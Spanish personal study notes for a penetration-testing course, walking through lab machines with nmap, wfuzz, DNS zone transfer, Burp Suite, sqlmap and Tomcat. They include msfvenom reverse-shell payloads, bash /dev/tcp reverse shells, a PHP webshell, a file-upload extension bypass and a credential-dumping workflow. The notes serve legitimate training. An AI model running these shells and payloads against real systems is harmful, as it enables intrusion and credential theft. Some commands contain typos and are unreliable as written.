MAC Address: 08:00:27:A3:34:2D (Oracle VirtualBox virtual NIC)

Service Info: Host: logan.hmv

editamos el fichero /etc/hosts

nano /etc/hosts

pegamos la ip de la maquina y con el archivo logan.hmv

192.168.0.156 logan.hmv

una vez recargada la pag podemos visualizarla

con wfuzz se puede encontrar directorios en el medio de [http://logan.hmv](http://logan.hmv) y no al final como habiamos visto

wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.logan.hmv" -u 192.168.0.156

--hc=404 : no retorna error

FUZZ.logan.hmv : va a ir probando todo lo que termine con .logan [en este caso la palabra reservada seria FUZZ]

EL resultado va a tirar un monton de lineas, entonces aplicamos unos filtros para que no muestre aquellas lineas que sean igual a 1

el resultado puede ser un admin, y si lo agregamos a la url [admin.logan.hmv] no va a funcionar porque hay que agregarlo a /etc/hosts

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Cómo Hacer un Ataque de Transferencia de Zona DNS

Un concepto realmente importante dentro del hacking y las redes, es el uso de los servidores DNS; y es por ello que en esta clase vamos a aprender cómo identificarlo dentro de un escaneo de nmap, así como entender el funcionamiento de los ataques de transferencia de zona, los cuales nos van a servir para encontrar más subdominios, para añadirlos al archivo hosts y así acceder a ellos.

Enlace para descargar la máquina vulnerable:

https://vulnyx.com/#hunter

analizamos la red con nmap

escaneamos la ip

nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.98

Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2024-04-23 14:22 -03

Nmap scan report for 192.168.0.98

Host is up (0.000093s latency).

Not shown: 65532 closed tcp ports (reset)

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u3 (protocol 2.0)

| ssh-hostkey:

| 2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)

| 256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)

|_ 256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)

53/tcp open domain (unknown banner: not currently available)

| fingerprint-strings:

| DNSVersionBindReqTCP:

| version

| bind

|_ currently available

| dns-nsid:

|_ bind.version: not currently available

80/tcp open http Apache httpd 2.4.38 ((Debian))

| http-robots.txt: 1 disallowed entry

|_hunterzone.nyx

|_http-server-header: Apache/2.4.38 (Debian)

|_http-title: Apache2 Debian Default Page: It works

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [https://nmap.org/cgi-bin/submit.cgi?new-service](https://nmap.org/cgi-bin/submit.cgi?new-service) :

SF-Port53-TCP:V=7.94SVN%I=7%D=4/23%Time=6627EE6B%P=x86_64-pc-linux-gnu%r(D

SF:NSVersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07versio

SF:n\x04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20cur

SF:rently\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");

MAC Address: 08:00:27:B1:4C:BB (Oracle VirtualBox virtual NIC)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ahi vemos en el puerto 80 que encontro un directorio llamado hunterzone.nyx y esta funcionando el puerto 53

copiamos la ip en /etc/hosts

192.168.0.98 hunterzone.nyx

ahora se puede hacer un ataque de zona de transferencia con el 52 y 80 open

Enumeramos con

dig axfr hunter.nyx @192.168.0.98

el resultado muestra muchos mas subdominios como se ve acontinuacion

dig axfr hunterzone.nyx @192.168.0.98

; <<>> DiG 9.19.21-1-Debian <<>> axfr hunterzone.nyx @192.168.0.98

;; global options: +cmd

hunterzone.nyx. 604800 IN SOA ns1.hunterzone.nyx. root.hunterzone.nyx. 2 604800 86400 2419200 604800

hunterzone.nyx. 604800 IN NS ns1.hunterzone.nyx.

?.hunterzone.nyx. 604800 IN TXT "devhunter.nyx"

admin.hunterzone.nyx. 604800 IN A 127.0.0.1

cloud.hunterzone.nyx. 604800 IN A 127.0.0.1

ftp.hunterzone.nyx. 604800 IN A 127.0.0.1

ns1.hunterzone.nyx. 604800 IN A 127.0.0.1

[www.hunterzone.nyx.](http://www.hunterzone.nyx.) 604800 IN A 127.0.0.1

hunterzone.nyx. 604800 IN SOA ns1.hunterzone.nyx. root.hunterzone.nyx. 2 604800 86400 2419200 604800

;; Query time: 4 msec

;; SERVER: 192.168.0.98#53(192.168.0.98) (TCP)

;; WHEN: Tue Apr 23 14:32:45 -03 2024

;; XFR size: 9 records (messages 1, bytes 294)

en el examen hay que probar todos los subdominios y agregarlos al /etc/hosts

AHora nos vamos a centrar solamente en “devhunter.nyx”

asi que lo agregamos a la ruta

# wfuzz -c --hc=404 -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -H "Host: FUZZ.devhunter.nyx" -u 192.168.0.98  

la ruta que me funciono en mi pc es esta, que se encuentra dentro de amass/

en los kali default estan dentro de /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1mil-2000.txt

Como el resultado muestra las mismas cantidad de lineas y cantidad de wats podemos aplicar un filtro como el siguiente

# wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -H "Host: FUZZ.devhunter.nyx" -u 192.168.0.98

--hl=367 aplica el filtro para que la linea

lo que devuelve es:

000000096: 200 26 L 51 W 525 Ch "files"

000002700: 400 10 L 35 W 301 Ch "m."

000002795: 400 10 L 35 W 301 Ch "ns2.cl.bellsouth.net."

000002885: 400 10 L 35 W 301 Ch "ns2.viviotech.net."

000002883: 400 10 L 35 W 301 Ch "ns1.viviotech.net."

000003050: 400 10 L 35 W 301 Ch "ns3.cl.bellsouth.net."

000004081: 400 10 L 35 W 301 Ch "ferrari.fortwayne.com."

000004083: 400 10 L 35 W 301 Ch "quatro.oweb.com."

000004082: 400 10 L 35 W 301 Ch "jordan.fortwayne.com."

000005019: 400 10 L 35 W 301 Ch "c.ns.emailvision.net."

000006037: 400 10 L 35 W 301 Ch "a.ns.emailvision.net."

000006042: 400 10 L 35 W 301 Ch "b.ns.emailvision.net."

000006044: 400 10 L 35 W 301 Ch "d.ns.emailvision.net."

000007619: 400 10 L 35 W 301 Ch "mail."

000008039: 400 10 L 35 W 301 Ch "ns1.simpleviewinc.com."

000008038: 400 10 L 35 W 301 Ch "ns2.simpleviewinc.com."

000009365: 400 10 L 35 W 301 Ch "ns-3.open.ro."

000009364: 400 10 L 35 W 301 Ch "ns-1.open.ro."

000009366: 400 10 L 35 W 301 Ch "ns-2.open.ro."

000009554: 400 10 L 35 W 301 Ch "#www"

000010608: 400 10 L 35 W 301 Ch "#mail"

000011885: 400 10 L 35 W 301 Ch "ns1.twtelecom.net."

000011898: 400 10 L 35 W 301 Ch "ns2.twtelecom.net."

000014313: 400 10 L 35 W 301 Ch "dns1.freshegg.net."

000016067: 400 10 L 35 W 301 Ch "pns.dtag.de."

000018198: 400 10 L 35 W 301 Ch "easydns1.dualtec.com.br."

000018196: 400 10 L 35 W 301 Ch "easydns2.dualtec.com.br."

el fichero “files” dio un codigo 200 entonces volvemos a editar el fichero /etc/hosts en donde ponemos el file adelante de la siguiente manera

192.168.0.98 files.devhunter.nyx

luego lo que sucede es que la extencion files sirve para subir archivos y pim pam pum

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Otras Herramientas Fuzzing Web – Uso de WFUZZ, DIRB y DIRSEARCH

En esta clase, veremos varias alternativas para realizar fuzzing web, ya que el entorno del examen es un laboratorio sin conexión a internet, y es por ello que resulta de gran utilidad conocer las alternativas que tenemos en caso de que una herramienta que necesitemos no se encuentre instalada.

Enlace para descargar la máquina vulnerable:

https://vulnyx.com/#jenk

─# wfuzz -c --hc=404  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://192.168.0.*/FUZZ                      

sin embargo el kali por defecto lo tiene en

 wfuzz -c --hc=404 --hl=367 -w /usr/share/wordlists/seclists/Discovery/Web-content/directory-list-lowercase-2.3-medium.txt http://192.168.0.*/FUZZ

/usr/share/wordlists/seclists/Discovery/Web-content/directory-list-lowecase-2.3-medium.txt

aparece un fichero llamado webcams y si lo pegamos al navegador nos aparecen unas camaras ...

supongamos que aparecen otros codigos de erros entonces se le aplica al filtro dicho codigo de la siguiente manera: --hc=404,403 etc

Tambien podemos usar “dirb” que es mas sencilla y es lo mismo pero no utiliza por defecto el diccionario que habiamos empleado sino que utiliza uno “comun”

LO bueno de wfuzz es que se puede cambiar las contrasenias por defecto y agregarle el diccionario que se quiera

DIRSEARCH

dirsearch -u http://192.168.0*

y aparece mas bonito para mis ojos pero no aparece el fichero webcams que antes habia aparecido y es porque usa un diccionario por defecto que es bastante poronga

asi que le pasamos un diccionario que queramos nosotros y manteniendonos en la misma linea

dirsearch -u http://192.168.0.69 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 

concluciones finales_ un subdominio es lo que va adelante de un fichero y un directorio es lo que va despues de la url

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# ExplotaciÃ³n de vulnerabilidad File Upload

Vamos a ver cómo podemos generar un payload en php que podamos subir al servidor y así obtener acceso a la máquina víctima. Para ello, vamos a acceder a un servidor FTP como Anonymous, que será donde subamos nuestro payload y adquirir esa intrusión al servidor.

Enlace a la máquina vulnerable:

https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/

iniciamos la maquina en vb

scann

└─# nmap -sn 192.168.0.0/24 == 192.168.0.248

└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.248

PORT STATE SERVICE VERSION

80/tcp open http Apache httpd 2.4.7 ((Ubuntu))

|_http-title: Please Login / CuteNews

|_http-server-header: Apache/2.4.7 (Ubuntu)

MAC Address: 08:00:27:EC:65:30 (Oracle VirtualBox virtual NIC)

search 192.168.0.248

searchexploit=cutenews

login/create

creamos el payload

└─# msfvenom -p php/reverse_php LHOST 192.168.0.82 LPORT 443 -f raw > pwned.php

[pwned.php](file://pwned.php)

└─# gobuster dir -u [http://192.168.0.248](http://192.168.0.248) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

obuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url: [http://192.168.0.248](http://192.168.0.248)

[+] Method: GET

[+] Threads: 10

[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

[+] Negative Status codes: 404

[+] User Agent: gobuster/3.6

[+] Timeout: 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/docs (Status: 301) [Size: 312] [--> [http://192.168.0.248/docs/]](http://192.168.0.248/docs/])

/uploads (Status: 301) [Size: 315] [--> [http://192.168.0.248/uploads/]](http://192.168.0.248/uploads/])

/skins (Status: 301) [Size: 313] [--> [http://192.168.0.248/skins/]](http://192.168.0.248/skins/])

/core (Status: 301) [Size: 312] [--> [http://192.168.0.248/core/]](http://192.168.0.248/core/])

/cdata (Status: 301) [Size: 313] [--> [http://192.168.0.248/cdata/]](http://192.168.0.248/cdata/])

/server-status (Status: 403) [Size: 293]

Progress: 207643 / 207644 (100.00%)

===============================================================

Finished

tuve que borrar el payload porque estaba mal escrito

└─# msfvenom -p php/reverse_php LHOST=192.168.0.82 LPORT=443 -f raw > pwned.php

└─# gobuster dir -u [http://192.168.0.248](http://192.168.0.248) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

└─$ nc -nlvp 443

listening on [any] 443 ...

connect to [192.168.0.82] from (UNKNOWN) [192.168.0.248] 48753

whoami

www-data

seguidamete

bash -c "sh -i >& /dev/tcp/192.168.0.82/4444 0>&1"

redireccionando la coneccion al puerto 4444 (portforwarding)

nc -nlvp4444

hay que hacerlo superfast guitar killer

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Primeros pasos tras la IntrusiĆ³n (Tratamiento de la TTY)

Una vez hayamos conseguido la intrusión al servidor, es posible que necesitemos realizar una serie de configuraciones a nuestra terminal para asegurar la intrusión, siendo muy importante realizar un correcto tratamiento de la TTY para poder presionar atajos del teclado como control +C sin perder la conexión, así como la ejecución de otros comandos.

UNa vez dentro, obteniendo la coneccion por el puerto 4444

script /dev/null -c bash

Despues de esto adquirimos un prompt

ctrl + z

salimos pero no se corta la coneccion

stty raw -echo; fg  
  
reset xterm  (quizas no aparezca cuando escbribamos)

pim pam pum, tenemos devuelta coneccion

export TERM=xterm  
  
export SHELL=bash  
  

ahora se puede mover libremente por la terminal sin que de error

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Obtener IntrusiĆ³n a Servidor Mediante uso de una Webshell

En esta clase vamos a aprender qué es una webshell y cómo podemos utilizarla para poder obtener ejecución remota de comandos en un servidor, así como la obtención de una reverse shell url-encodeando el comando para adquirir esa intrusión.

Enlace de la máquina vulnerable:

https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/

crear un fichero php con el codigo:

<?php  
  
        echo "<pre>" . shell_exec($_request['cmd']) . "</pre>";  
?>  

cargarlo en upload y desde la barra del navegador agregarle al final de la url webshell.php?cmd=y el comando en bash

abrimos burpsuite

vamos a “decoder” y pegamos la revershell

└─# bash -c "bash -i >& /dev/tcp/miIP/443 0>&1"         

vamos a las opciones de la derecha, "encode as" y seleccionamos la opcion URL

Ahora el comando de la revershell ahora lo tenemos "urlencodeado"

nos ponemos en escucha con netcat por el puerto 443

luego en la url del navegador, insertamos la url resultante despues de ?cmd=

y si chequeamos la terminal por donde estabamos escuchando ya tenemos conneccion, esto puede obtenerse cuando msfvenom no funciona como me paso

a diferencia de msfvenom esta coneccion es estable y no se pierde

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Bypass RestricciÃ³n de File Upload

Es posible que en diversas ocasiones no podamos subir directamente un archivo en .php dentro de un panel de subida de archivos, por lo que tenemos que encontrar la forma de hacer un bypass de este tipo de restricciones; y una de las posibles formas es cambiar la extensión de nuestro payload, para que no sea .php pero que a su vez también funcione con php.

Enlace a la máquina vulnerable:

https://tryhackme.com/room/vulnversity

ingresa por el puerto 3333 donde corre un servidor web (apache) / fuzzing = /internal/

dentro del directorio se aloja un upload pero no permite ciertas extenciones, con lo cual lo cambiamos

mv pwned.php pwned.phtml

pim pam pum te lo deja subir

ahora para saber donde se subio el archivo hacemos fuzzing again pero desde /internal/

pim pam pum ya tenemos la coneccion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Burp Suite – Modificar Peticiones HTTP

En esta clase vamos a aprender a utilizar burp suite, el cual consiste en una herramienta enfocada al hacking web que actúa como proxy entre el navegador y el servidor web, de tal forma que podremos interceptar las peticiones y realizar distintos tipos de ataques.

Enlace a la máquina vulnerable:

https://tryhackme.com/room/vulnversity

ejecutamos el fichero de la vpn con openvpn e iniciamos la maquina

nmap -Pn ip  
  
Not shown: 994 closed tcp ports (reset)  
PORT     STATE SERVICE  
21/tcp   open  ftp  
22/tcp   open  ssh  
139/tcp  open  netbios-ssn  
445/tcp  open  microsoft-ds  
3128/tcp open  squid-http  
3333/tcp open  dec-notes  

# gobuster dir -u http://10.10.176.204:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
  
└─# gobuster dir -u http://10.10.176.204:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.10.176.204:3333  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/images               (Status: 301) [Size: 322] [--> http://10.10.176.204:3333/images/]                                                                               
/css                  (Status: 301) [Size: 319] [--> http://10.10.176.204:3333/css/]                                                                                  
/js                   (Status: 301) [Size: 318] [--> http://10.10.176.204:3333/js/]                                                                                   
/fonts                (Status: 301) [Size: 321] [--> http://10.10.176.204:3333/fonts/]                                                                                
/internal             (Status: 301) [Size: 324] [--> http://10.10.176.204:3333/internal/]                                                                             
Progress: 7730 / 207644 (3.72%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 7732 / 207644 (3.72%)  
===============================================================  
Finished  
===============================================================  
          

**#importante# poner el puerto al final de la ip, de lo contrario no va a dar nada**

copiamos el resultado y lo pegamos en el navegador

http://10.10.176.204:3333/internal/

inmediatamente nos lleva a un upload y podemos subir un archivo.

#se puede cambiarle el nombre para poder subirlo o utilizar burpsuite para interceptar

-abrimos burpsuite

-ajustes de firefox, network, proxy manual, add 127.0.0.1 p 8080

#Subimos el payload a upload

#abrimos burpsuite y vemos como lo intercepto

cambiamos el nombre y ponemos fordward y succes :) no hizo falta cambiarle el nombre en local

para poder seguir navegando por la red hay que sacar la interceptacion /intercept is on - interept is off/

Ahora podemos pararnos en [http://ip:3333/uploads](http://ip:3333/uploads) y ejecutar el payload ponernos a la escucha con netcat

nc -nlvp 443 

y pim pam pum

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Burp Suite – Uso del Repeater

Una vez hayamos interceptado una petición HTTP con burp suite, es posible que necesitemos realizar diversas comprobaciones dentro de una petición para encontrar la vulnerabilidad; y para ello disponemos del repeater. De tal forma que podremos modificar de forma cómoda las peticiones e ir enviándolas al servidor web para analizar sus respuestas.

Enlace a la máquina vulnerable:

https://tryhackme.com/room/vulnversity

 nmap -Pn -vvv 10.10.30.153  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 12:27 -03  
Initiating Parallel DNS resolution of 1 host. at 12:27  
Completed Parallel DNS resolution of 1 host. at 12:27, 0.01s elapsed  
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]  
Initiating SYN Stealth Scan at 12:27  
Scanning 10.10.30.153 [1000 ports]  
Discovered open port 139/tcp on 10.10.30.153  
Discovered open port 22/tcp on 10.10.30.153  
Discovered open port 445/tcp on 10.10.30.153  
Discovered open port 21/tcp on 10.10.30.153  
Discovered open port 3333/tcp on 10.10.30.153  
Discovered open port 3128/tcp on 10.10.30.153  
Completed SYN Stealth Scan at 12:28, 4.00s elapsed (1000 total ports)  
Nmap scan report for 10.10.30.153  
Host is up, received user-set (0.31s latency).  
Scanned at 2024-04-29 12:27:59 -03 for 4s  
Not shown: 994 closed tcp ports (reset)  
PORT     STATE SERVICE      REASON  
21/tcp   open  ftp          syn-ack ttl 61  
22/tcp   open  ssh          syn-ack ttl 61  
139/tcp  open  netbios-ssn  syn-ack ttl 61  
445/tcp  open  microsoft-ds syn-ack ttl 61  
3128/tcp open  squid-http   syn-ack ttl 61  
3333/tcp open  dec-notes    syn-ack ttl 61  
  
Read data files from: /usr/bin/../share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 4.10 seconds  
           Raw packets sent: 1086 (47.784KB) | Rcvd: 1190 (64.608KB)  
  
------------------------------------------------------------------------------------------------------------------  
  
 gobuster dir -u http://10.10.30.153:3333 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.10.30.153:3333  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/images               (Status: 301) [Size: 320] [--> http://10.10.30.153:3333/images/]  
/css                  (Status: 301) [Size: 317] [--> http://10.10.30.153:3333/css/]  
/js                   (Status: 301) [Size: 316] [--> http://10.10.30.153:3333/js/]  
/fonts                (Status: 301) [Size: 319] [--> http://10.10.30.153:3333/fonts/]  
/internal             (Status: 301) [Size: 322] [--> http://10.10.30.153:3333/internal/]  
Progress: 2976 / 207644 (1.43%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 2976 / 207644 (1.43%)  
===============================================================  
Finished  
===============================================================  
                    

search http://10.10.30.153:3333/internal/]

#config firefox

#open burpsuite

Continuando con lo mismo si no sabemos que extencion porner en el payload podemos en la pag de proxy, intercept is on click der y send to repeater o crtl + r, y lo envia

a dicho sector

En repeater tenemos dos colomnas, request y response

![file:///tmp/.79UXO2/3.png](file:///tmp/.79UXO2/3.png)

EN la columna de response abajo de todo muestra si lo permitio o no, “extension not allowed”

Una vez acertado nos dirigimos a la parte de proxy y enviamos el archivo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Burp Suite – Uso del Intruder

Una funcionalidad muy poderosa que tiene burp suite es el intruder, el cual nos permitirá realizar ataques de diccionarios en cualquier parte de nuestras peticiones HTTP. Por lo que en esta ocasión, veremos cómo hacer fuzzing utilizando un diccionario con burp suite.

Enlace a la máquina vulnerable:

https://tryhackme.com/room/vulnversity

DE la misma manera que hicimos anteriormente; crtl + i lo mandamos al intruder; seleccionamos todo y le damos a clear, creamos con nano un fichero con extensines

seleccionamos la extension y le damos a add

![file:///tmp/.79UXO2/4.png](file:///tmp/.79UXO2/4.png)

ahora vamos a setting > grep extract (sirve para indicarle a burpsuite cuando un intento fue exitoso y cuando no.

seleccionamos add > refetch response / seleccionamos “extension not allowed” y queda guardado en el recuadro

seleccionamos payload > payload setting (simple list) > load > seleccionamos el fichero con la extensiones / se cargan todas las extensines que teniamos dentro

seleccionamos > stratattack

pim pam pum

otro ejemplo

Supongamos que no tengo para hacer fuzzing web > pegamos la ip:3333 > interceptamos con burpsuite

en la url ingresamos /test/ > add > intruder> setting > payload > ingresamos manualmente los posibles directorios/ start attack y pim pam pum

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Inyecciones SQL – Uso de SQLmap

La vulnerabilidad SQL Injection se acontece en bases de datos, y para auditar y explotar esta vulnerabilidad disponemos de una herramienta conocida como sqlmap, la cual nos permite de forma automatizada realizar una explotaciÃ³n de esta vulnerabilidad y poder acceder a las tablas, columnas y registros de la base de datos objetivo.

Enlace de la mÃ¡quina vulnerable:

https://vulnyx.com/#shop

tiene abierto el puerto 22 y 80 > fuzzing > administrator > login

sqlpmap -u http://ip/administrator/ --forms --dbs --batch 

De forma automatizada va a ir probando inyections sql

Confirmar todo y que no rompa las bolas

encontro : #information_schema default

#mysql default

#performance_schema defautl

#webapp

webapp no esta por defecto asi que debe ser

sqlmap -u http://ip/administrator/ --forms -D webapp --tables --batch

nos arroja una tabla nombre usrs, asi que

sqlmap -u http://ip/administrator/ --forms -D webapp -T Users --columuns --batch

osea, dentro de la base de datos “administrator” > tabla “webapp > quiero ver las columnas de ”users"

NOs encontro un par de datos (username y password) y quiero ver los registros de eso asi que:

sqlmap -u http://ip/administrator/ --forms -D webapp -T Users -C username,password --dump --batch

pim pam pum nos da el usr y pass

open terminal >

ssh user@ip

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Hacking Servidor Tomcat

En esta clase, vamos a realizar una intrusión a un servidor apache tomcat, el cual cuenta con las credenciales por defecto y además tiene un panel de subida de archivos, mediante el cual utilizaremos msfvenom para crear y subir un archivo .war malicioso al servidor, que nos proporcionará una reverse shell.

Enlace de la máquina vulnerable:

https://vulnyx.com/#deploy

└─# arp-scan -I wlan0 --localnet  
  
192.168.0.59    08:00:27:ee:f1:42       PCS Systemtechnik GmbH  

└─# nmap -sS -sC -sV -p- --open --min-rate 5000 -Pn -vvv -n 192.168.0.59  
  
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
| ssh-hostkey:   
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP4OvUJ0xKoulS7xOYz1485bm/ZBVN/86xLQvh7Gqa1DmEWz/eHP2C3MJQnqTFPOEh18FULOzj9fiehyzhd6CM7+qBZ/4B9b5RkOx7AL+S3aRIey4qQj7/k72PqMBkyfD2krjNOg7ZZe8z9o0A4VyeDljG6ukVFeN6PEtWWtdmmnVJztgzX0wPWPaO9GM5hITyvpIB/Y/IqueYR+ft2n5ROLLUfjFLezB+zSa6xkDPGiY9qMZBMXA/6oaaD3TV1x6jfTtZi+Aca0scDfOTJUVlSwZYaHrJQSNlKFJhniucqq/zxOnMIHjs/v1YXYCh0jlYDsb5J/NqTzEPMKkbtwn97T5/FQvsWDGJFTtxvCCrInmnUHB+cG8dSRYQZ763QoPxF/feDSNbrKjTv8D1K2EPhf1rBGQGIObgatVHNFclVWfuq7sn4x9olNnbsEogIQ5mbEq0mBlgOW5vowFxUkI60Ond4Dl7H4fkCeiPfngWFrT+6cQoNgA3HRKf6NtQeYs=  
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNDNbes4gKOy7nXoXxW1kPwOX/vuxNkae5WSrIFu+ZD8OUIX5OK8e6o7IZDJAxn/ACAJL9Mm+tA44syyemA6C40=  
|   256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINItrDSHbBfPB1CJosqklAQXN4/Mt++ocUqbiG861ZSG  
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.56 ((Debian))  
|_http-title: Apache2 Debian Default Page: It works  
| http-methods:   
|_  Supported Methods: OPTIONS HEAD GET POST  
|_http-server-header: Apache/2.4.56 (Debian)  
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat  
|_http-open-proxy: Proxy might be redirecting requests  
| http-methods:   
|_  Supported Methods: OPTIONS GET HEAD POST  
|_http-title: Apache Tomcat  
MAC Address: 08:00:27:EE:F1:42 (Oracle VirtualBox virtual NIC)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

8080/tcp open http syn-ack ttl 64 Apache Tomcat

search 192.168.0.59:8080

![file:///tmp/.79UXO2/5.png](file:///tmp/.79UXO2/5.png)

Esto es un tomcat recien instalado y sin configurar, en el examen va a caer algo asi

SEE > MANAGER WEBAPP > login > credenciales for default > search hacktricks apache tomcat default credentials

pero si le ponemos cancelar al login de tomcat nos aparece las credenciales, porque a mi no me funcionaron las por default

![file:///tmp/.79UXO2/6.png](file:///tmp/.79UXO2/6.png)

<role rolename="manager-gui"/>

<user username="tomcat" password="s3cret" roles="manager-gui"/>

Como se vera, habia probado con tomcat=s3cr3t pero era con un solo 3

NOS LOGEAMOS

![file:///tmp/.79UXO2/7.png](file:///tmp/.79UXO2/7.png)

Dentro del panel podemos ir hacia la parte de cargar file

![file:///tmp/.79UXO2/8.png](file:///tmp/.79UXO2/8.png)

Creacion del malware

└─# hostname -I  
192.168.0.82   
  
  
└─# msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.82 LPORT=443 -f war > reversel.war  

Se hace con java por el tipo de archivo que es war

Se aconseja crear otro por las dudas

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.82 LPORT=443 -f war > revershe2.war

